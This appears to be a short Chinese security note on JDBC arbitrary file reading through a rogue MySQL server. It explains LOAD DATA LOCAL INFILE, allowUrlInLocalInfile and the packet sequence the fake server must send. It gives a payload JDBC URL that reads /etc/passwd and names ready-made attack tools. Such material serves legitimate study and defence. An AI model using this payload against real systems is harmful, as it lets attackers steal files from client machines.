# JDBC内容汇总

# jdbc任意文件读取

### 原理

**1、 load data infile**

load data infile：将服务器上的文件插入表中。

load data local infile：将客户端的文件插入表中。

**2、 allowUrlInLocalInfile**

能够使用URL类支持的所有协议，进行SSRF获取file协议读取本地文件。

在mysql-connector-java包中 存在sendFileToServer方法。

**具体过程**

需要达到能够读取客户端任意文件目的，伪造的mysql服务端必须能够发送以下几个数据包：

* 向mysql client发送Server greeting包；
* 对mysql client的登录包做Accept all authentications响应(即任意用户密码都能登录)；
* 等待 Client 端发送一个Query Package；
* 回复一个file transfer请求。

具体 payload 如下   jdbc:mysql://127.0.0.1:3306/DB\_NAME?user\=fileread\_file:///etc/passwd&maxAllowedPacket\=655360&allowUrlInLocalInfile\=true

### 利用

可以直接利用fake-mysql-cli 和 java-chains 现成脚本工具直接使用

## jdbc
